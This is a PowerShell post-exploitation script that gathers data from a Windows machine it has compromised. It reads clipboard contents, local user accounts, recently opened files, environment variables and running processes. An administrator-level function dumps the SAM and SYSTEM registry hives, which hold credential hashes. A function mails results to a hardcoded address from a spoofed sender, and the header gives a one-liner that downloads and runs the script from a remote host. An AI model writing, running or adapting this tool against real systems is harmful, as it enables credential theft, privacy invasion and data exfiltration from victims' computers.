#############################################################################################################
###																										  ###
### 		Information scrapper : Post exploitation information scrapper  powershell script			  ###	
###																										  ###		
### 		By AXANO																					  ###	
###																										  ###
#############################################################################################################

<#

FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
########## OR #############
USE 
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"

.SYNOPSIS



.EXAMPLE



.EXAMPLE


.USEFUL	


### Measures time needed to execute certain command
Measure-Command { commandToExecute }



.TODO

###check if user is in administrator group, if true and script inst run as admin try UAC bypass
https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server


#>


function Main(){
initialize
#nonAdministrativeScrapperFunctions
#mail "test"
}

### SMTP mailing tool
### Sends a mail using a free smtp server
### $messageBody is send as message body in the mail
function mail($messageBody){

$smtpServer = "smtp.scarlet.be"

 #Creating a Mail object
 $msg = new-object Net.Mail.MailMessage

 #Creating SMTP server object
 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
 $smtp.Enablessl = $true
 $smtp.port = 25
 #Email structure 
 ### !!!! From email can be spoofed
 ### On 12/09/2018 you could still use any gmail account as sender and reciever (TESTED)
 $msg.From = "powershell@gmail.com"
 $msg.To.Add("perselis.e@gmail.com")

 $msg.subject = "Scrapper information"


 $msg.IsBodyHTML = $true
 $msg.body = $messageBody +"<br /><br />"

 $ok=$true 
 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
 try{
        $smtp.Send($msg)
        Write-Host "SENT"

 }
 catch {
    $error[0]
    $_.Exception.Response
    $ok=$false
 }
 finally{
    $msg.Dispose()

 }
 if($ok){
    Write-Host "EVERYTHING PASSED"
 }

}

function initialize(){
### Changes the window title
$host.ui.RawUI.WindowTitle = "Information scrapper"
}

function nonAdministrativeScrapperFunctions(){

### Get current date
[System.DateTime]::Now
# or
# Get-Date

### Get execution policy to see if running a script is possible
Get-ExecutionPolicy


<#
NOT NEEDED, systeminfo GATHERS THIS INFORMATION
### Get OS version
[Environment]::OSVersion

### Get OS type (home/pro/enterprise)
(Get-WmiObject -class Win32_OperatingSystem).Caption

#>

### Detailed system info
systeminfo

### Gets contents of clipboard
Get-Clipboard

### Gets information of installation settings
Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion

### Detects if powershell is run as administrator
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")

### Lists recently opened files
dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\"

### Gets bios info (can be used to find out if a machine runs in a virtual environment)
Get-WmiObject win32_bios

### Gets  name, status, SID, Lastlogon of all local users
Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-List *

### Checks if computer is in domain
if ((gwmi win32_computersystem).partofdomain -eq $true) {
    write-host -fore green "I am domain joined!"
} else {
    write-host -fore red "Ooops, workgroup!"
}

### Gets all running processes with details
Get-Process
### Slow but more detailed alternative (not needed if results will be stored in variable)
# Get-Process | format-list *

### Gets all environment variables
Get-ChildItem env:
}


function administrativeScrapperFunctions(){
### Dump sam (needs administrator rights)
reg save HKLM\SAM .\sam

### Dump system (needs administrator rights)
reg save HKLM\SYSTEM .\system
}

### Strict mode is scoped.
### It prevents minor scripting errors like accessing non existent variables
Set-StrictMode -Version Latest

### Calling Main
. Main
